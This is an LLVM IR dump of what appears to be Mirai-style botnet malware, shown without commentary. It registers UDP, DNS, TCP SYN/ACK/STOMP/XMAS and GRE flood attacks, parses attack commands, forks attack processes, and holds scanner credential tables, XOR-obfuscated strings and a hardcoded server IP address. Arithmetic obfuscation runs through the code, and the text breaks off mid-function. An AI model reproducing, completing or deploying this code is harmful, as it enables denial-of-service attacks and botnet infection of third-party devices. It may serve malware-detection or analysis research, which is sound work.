; ModuleID = 'host/ir_sub/Extendo.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }
%struct.fd_set.26 = type { [16 x i64] }
%struct.timeval.27 = type { i64, i64 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [15 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@scanner_pid = common global i32 0, align 4
@fake_time = global i32 0, align 4
@conn_table = common global %struct.scanner_connection* null, align 8
@rsck = common global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"&;; \00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"5:?;\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"<!: acam\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c" 18:1 \00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"0125!8 \00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"$5''#;&0\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"509=:\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"\22=.,\22\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"'!$$;& \00", align 1
@.str.10 = private unnamed_addr constant [13 x i8] c"c!>\19?;d509=:\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"efg`a\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"!'1&\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"\1B,<8#\07\13l\00", align 1
@.str.14 = private unnamed_addr constant [9 x i8] c"\07f2\13%\1A\12'\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [15 x i8] c"191.96.112.109\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = global i16 0, align 2
@auth_table_len = global i32 0, align 4
@auth_table = global %struct.scanner_auth* null, align 8
@table = common global [31 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -555811921, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpdns)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add i32 %17, 1683662487
  %19 = add i32 %18, 1
  %20 = sub i32 %19, 1683662487
  %21 = add nsw i32 %17, 1
  %22 = sext i32 %20 to i64
  %23 = mul i64 %22, 8
  %24 = call i8* @realloc(i8* %15, i64 %23) #6
  %25 = bitcast i8* %24 to %struct.attack_method**
  store %struct.attack_method** %25, %struct.attack_method*** @methods, align 8
  %26 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %27 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %28 = load i8, i8* @methods_len, align 1
  %29 = sub i8 0, %28
  %30 = sub i8 0, 1
  %31 = add i8 %29, %30
  %32 = sub i8 0, %31
  %33 = add i8 %28, 1
  store i8 %32, i8* @methods_len, align 1
  %34 = zext i8 %28 to i64
  %35 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %27, i64 %34
  store %struct.attack_method* %26, %struct.attack_method** %35, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 15
  br i1 %4, label %5, label %28

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #6
  br label %17

; <label>:17:                                     ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = sub i32 0, %22
  %24 = sub i32 0, 1
  %25 = add i32 %23, %24
  %26 = sub i32 0, %25
  %27 = add nsw i32 %22, 1
  store i32 %26, i32* %1, align 4
  br label %2

; <label>:28:                                     ; preds = %2
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %251

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 0, 4
  %27 = add i64 %25, %26
  %28 = sub i64 %25, 4
  %29 = trunc i64 %27 to i32
  store i32 %29, i32* %4, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %33

; <label>:32:                                     ; preds = %17
  br label %251

; <label>:33:                                     ; preds = %17
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %3, align 8
  %36 = load i8, i8* %34, align 1
  store i8 %36, i8* %7, align 1
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = sub i64 0, 1
  %40 = add i64 %38, %39
  %41 = sub i64 %38, 1
  %42 = trunc i64 %40 to i32
  store i32 %42, i32* %4, align 4
  %43 = load i32, i32* %4, align 4
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %33
  br label %251

; <label>:46:                                     ; preds = %33
  %47 = load i8*, i8** %3, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %3, align 8
  %49 = load i8, i8* %47, align 1
  store i8 %49, i8* %8, align 1
  %50 = load i32, i32* %4, align 4
  %51 = sext i32 %50 to i64
  %52 = add i64 %51, 4644216429625274181
  %53 = sub i64 %52, 1
  %54 = sub i64 %53, 4644216429625274181
  %55 = sub i64 %51, 1
  %56 = trunc i64 %54 to i32
  store i32 %56, i32* %4, align 4
  %57 = load i8, i8* %8, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 0
  br i1 %59, label %60, label %61

; <label>:60:                                     ; preds = %46
  br label %251

; <label>:61:                                     ; preds = %46
  %62 = load i32, i32* %4, align 4
  %63 = sext i32 %62 to i64
  %64 = load i8, i8* %8, align 1
  %65 = zext i8 %64 to i64
  %66 = mul i64 5, %65
  %67 = icmp ult i64 %63, %66
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %61
  br label %251

; <label>:69:                                     ; preds = %61
  %70 = load i8, i8* %8, align 1
  %71 = zext i8 %70 to i64
  %72 = call noalias i8* @calloc(i64 %71, i64 24) #6
  %73 = bitcast i8* %72 to %struct.attack_target*
  store %struct.attack_target* %73, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %74

; <label>:74:                                     ; preds = %124, %69
  %75 = load i32, i32* %5, align 4
  %76 = load i8, i8* %8, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp slt i32 %75, %77
  br i1 %78, label %79, label %130

; <label>:79:                                     ; preds = %74
  %80 = load i8*, i8** %3, align 8
  %81 = bitcast i8* %80 to i32*
  %82 = load i32, i32* %81, align 4
  %83 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %84 = load i32, i32* %5, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %83, i64 %85
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %86, i32 0, i32 1
  store i32 %82, i32* %87, align 4
  %88 = load i8*, i8** %3, align 8
  %89 = getelementptr inbounds i8, i8* %88, i64 4
  store i8* %89, i8** %3, align 8
  %90 = load i8*, i8** %3, align 8
  %91 = getelementptr inbounds i8, i8* %90, i32 1
  store i8* %91, i8** %3, align 8
  %92 = load i8, i8* %90, align 1
  %93 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %94 = load i32, i32* %5, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %93, i64 %95
  %97 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %96, i32 0, i32 2
  store i8 %92, i8* %97, align 4
  %98 = load i32, i32* %4, align 4
  %99 = sext i32 %98 to i64
  %100 = add i64 %99, -4319381412716683376
  %101 = sub i64 %100, 5
  %102 = sub i64 %101, -4319381412716683376
  %103 = sub i64 %99, 5
  %104 = trunc i64 %102 to i32
  store i32 %104, i32* %4, align 4
  %105 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %106 = load i32, i32* %5, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %105, i64 %107
  %109 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %108, i32 0, i32 0
  %110 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %109, i32 0, i32 0
  store i16 2, i16* %110, align 4
  %111 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %112 = load i32, i32* %5, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %111, i64 %113
  %115 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %114, i32 0, i32 1
  %116 = load i32, i32* %115, align 4
  %117 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %118 = load i32, i32* %5, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 0
  %122 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %121, i32 0, i32 2
  %123 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %122, i32 0, i32 0
  store i32 %116, i32* %123, align 4
  br label %124

; <label>:124:                                    ; preds = %79
  %125 = load i32, i32* %5, align 4
  %126 = add i32 %125, 1656316568
  %127 = add i32 %126, 1
  %128 = sub i32 %127, 1656316568
  %129 = add nsw i32 %125, 1
  store i32 %128, i32* %5, align 4
  br label %74

; <label>:130:                                    ; preds = %74
  %131 = load i32, i32* %4, align 4
  %132 = sext i32 %131 to i64
  %133 = icmp ult i64 %132, 1
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %130
  br label %251

; <label>:135:                                    ; preds = %130
  %136 = load i8*, i8** %3, align 8
  %137 = getelementptr inbounds i8, i8* %136, i32 1
  store i8* %137, i8** %3, align 8
  %138 = load i8, i8* %136, align 1
  store i8 %138, i8* %9, align 1
  %139 = load i32, i32* %4, align 4
  %140 = sext i32 %139 to i64
  %141 = add i64 %140, 5974061085784853318
  %142 = sub i64 %141, 1
  %143 = sub i64 %142, 5974061085784853318
  %144 = sub i64 %140, 1
  %145 = trunc i64 %143 to i32
  store i32 %145, i32* %4, align 4
  %146 = load i8, i8* %9, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp sgt i32 %147, 0
  br i1 %148, label %149, label %243

; <label>:149:                                    ; preds = %135
  %150 = load i8, i8* %9, align 1
  %151 = zext i8 %150 to i64
  %152 = call noalias i8* @calloc(i64 %151, i64 16) #6
  %153 = bitcast i8* %152 to %struct.attack_option*
  store %struct.attack_option* %153, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %154

; <label>:154:                                    ; preds = %236, %149
  %155 = load i32, i32* %5, align 4
  %156 = load i8, i8* %9, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp slt i32 %155, %157
  br i1 %158, label %159, label %242

; <label>:159:                                    ; preds = %154
  %160 = load i32, i32* %4, align 4
  %161 = sext i32 %160 to i64
  %162 = icmp ult i64 %161, 1
  br i1 %162, label %163, label %164

; <label>:163:                                    ; preds = %159
  br label %251

; <label>:164:                                    ; preds = %159
  %165 = load i8*, i8** %3, align 8
  %166 = getelementptr inbounds i8, i8* %165, i32 1
  store i8* %166, i8** %3, align 8
  %167 = load i8, i8* %165, align 1
  %168 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %169 = load i32, i32* %5, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %168, i64 %170
  %172 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %171, i32 0, i32 1
  store i8 %167, i8* %172, align 8
  %173 = load i32, i32* %4, align 4
  %174 = sext i32 %173 to i64
  %175 = sub i64 %174, -1663759474514509180
  %176 = sub i64 %175, 1
  %177 = add i64 %176, -1663759474514509180
  %178 = sub i64 %174, 1
  %179 = trunc i64 %177 to i32
  store i32 %179, i32* %4, align 4
  %180 = load i32, i32* %4, align 4
  %181 = sext i32 %180 to i64
  %182 = icmp ult i64 %181, 1
  br i1 %182, label %183, label %184

; <label>:183:                                    ; preds = %164
  br label %251

; <label>:184:                                    ; preds = %164
  %185 = load i8*, i8** %3, align 8
  %186 = getelementptr inbounds i8, i8* %185, i32 1
  store i8* %186, i8** %3, align 8
  %187 = load i8, i8* %185, align 1
  store i8 %187, i8* %12, align 1
  %188 = load i32, i32* %4, align 4
  %189 = sext i32 %188 to i64
  %190 = sub i64 %189, -7247802132730895121
  %191 = sub i64 %190, 1
  %192 = add i64 %191, -7247802132730895121
  %193 = sub i64 %189, 1
  %194 = trunc i64 %192 to i32
  store i32 %194, i32* %4, align 4
  %195 = load i32, i32* %4, align 4
  %196 = load i8, i8* %12, align 1
  %197 = zext i8 %196 to i32
  %198 = icmp slt i32 %195, %197
  br i1 %198, label %199, label %200

; <label>:199:                                    ; preds = %184
  br label %251

; <label>:200:                                    ; preds = %184
  %201 = load i8, i8* %12, align 1
  %202 = zext i8 %201 to i32
  %203 = sub i32 0, %202
  %204 = sub i32 0, 1
  %205 = add i32 %203, %204
  %206 = sub i32 0, %205
  %207 = add nsw i32 %202, 1
  %208 = sext i32 %206 to i64
  %209 = call noalias i8* @calloc(i64 %208, i64 1) #6
  %210 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %211 = load i32, i32* %5, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %210, i64 %212
  %214 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %213, i32 0, i32 0
  store i8* %209, i8** %214, align 8
  %215 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %216 = load i32, i32* %5, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %215, i64 %217
  %219 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %218, i32 0, i32 0
  %220 = load i8*, i8** %219, align 8
  %221 = load i8*, i8** %3, align 8
  %222 = load i8, i8* %12, align 1
  %223 = zext i8 %222 to i32
  call void @util_memcpy(i8* %220, i8* %221, i32 %223)
  %224 = load i8, i8* %12, align 1
  %225 = zext i8 %224 to i32
  %226 = load i8*, i8** %3, align 8
  %227 = sext i32 %225 to i64
  %228 = getelementptr inbounds i8, i8* %226, i64 %227
  store i8* %228, i8** %3, align 8
  %229 = load i8, i8* %12, align 1
  %230 = zext i8 %229 to i32
  %231 = load i32, i32* %4, align 4
  %232 = add i32 %231, 1490613082
  %233 = sub i32 %232, %230
  %234 = sub i32 %233, 1490613082
  %235 = sub nsw i32 %231, %230
  store i32 %234, i32* %4, align 4
  br label %236

; <label>:236:                                    ; preds = %200
  %237 = load i32, i32* %5, align 4
  %238 = add i32 %237, 209421436
  %239 = add i32 %238, 1
  %240 = sub i32 %239, 209421436
  %241 = add nsw i32 %237, 1
  store i32 %240, i32* %5, align 4
  br label %154

; <label>:242:                                    ; preds = %154
  br label %243

; <label>:243:                                    ; preds = %242, %135
  %244 = call i32* @__errno_location() #7
  store i32 0, i32* %244, align 4
  %245 = load i32, i32* %6, align 4
  %246 = load i8, i8* %7, align 1
  %247 = load i8, i8* %8, align 1
  %248 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %249 = load i8, i8* %9, align 1
  %250 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %245, i8 zeroext %246, i8 zeroext %247, %struct.attack_target* %248, i8 zeroext %249, %struct.attack_option* %250)
  br label %251

; <label>:251:                                    ; preds = %243, %199, %183, %163, %134, %68, %60, %45, %32, %16
  %252 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %253 = icmp ne %struct.attack_target* %252, null
  br i1 %253, label %254, label %257

; <label>:254:                                    ; preds = %251
  %255 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %256 = bitcast %struct.attack_target* %255 to i8*
  call void @free(i8* %256) #6
  br label %257

; <label>:257:                                    ; preds = %254, %251
  %258 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %259 = icmp ne %struct.attack_option* %258, null
  br i1 %259, label %260, label %264

; <label>:260:                                    ; preds = %257
  %261 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %262 = load i8, i8* %9, align 1
  %263 = zext i8 %262 to i32
  call void @free_opts(%struct.attack_option* %261, i32 %263)
  br label %264

; <label>:264:                                    ; preds = %260, %257
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %22, label %19

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %13, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19, %6
  ret void

; <label>:23:                                     ; preds = %19
  %24 = call i32 @fork() #6
  store i32 %24, i32* %14, align 4
  %25 = load i32, i32* %14, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %23
  call void @exit(i32 0) #8
  unreachable

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* %14, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %36

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* %7, align 4
  %33 = call i32 @sleep(i32 %32)
  %34 = call i32 @getppid() #6
  %35 = call i32 @kill(i32 %34, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:36:                                     ; preds = %28
  store i32 0, i32* %15, align 4
  br label %37

; <label>:37:                                     ; preds = %67, %36
  %38 = load i32, i32* %15, align 4
  %39 = load i8, i8* @methods_len, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %74

; <label>:42:                                     ; preds = %37
  %43 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %44 = load i32, i32* %15, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %43, i64 %45
  %47 = load %struct.attack_method*, %struct.attack_method** %46, align 8
  %48 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %47, i32 0, i32 1
  %49 = load i8, i8* %48, align 8
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* %8, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %50, %52
  br i1 %53, label %54, label %66

; <label>:54:                                     ; preds = %42
  %55 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %55, i64 %57
  %59 = load %struct.attack_method*, %struct.attack_method** %58, align 8
  %60 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %59, i32 0, i32 0
  %61 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %60, align 8
  %62 = load i8, i8* %9, align 1
  %63 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %64 = load i8, i8* %11, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %61(i8 zeroext %62, %struct.attack_target* %63, i8 zeroext %64, %struct.attack_option* %65)
  br label %74

; <label>:66:                                     ; preds = %42
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %15, align 4
  %69 = sub i32 0, %68
  %70 = sub i32 0, 1
  %71 = add i32 %69, %70
  %72 = sub i32 0, %71
  %73 = add nsw i32 %68, 1
  store i32 %72, i32* %15, align 4
  br label %37

; <label>:74:                                     ; preds = %54, %37
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %38

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %35

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = sub i32 0, 1
  %33 = sub i32 %31, %32
  %34 = add nsw i32 %31, 1
  store i32 %33, i32* %5, align 4
  br label %10

; <label>:35:                                     ; preds = %10
  %36 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %37 = bitcast %struct.attack_option* %36 to i8*
  call void @free(i8* %37) #6
  br label %38

; <label>:38:                                     ; preds = %35, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
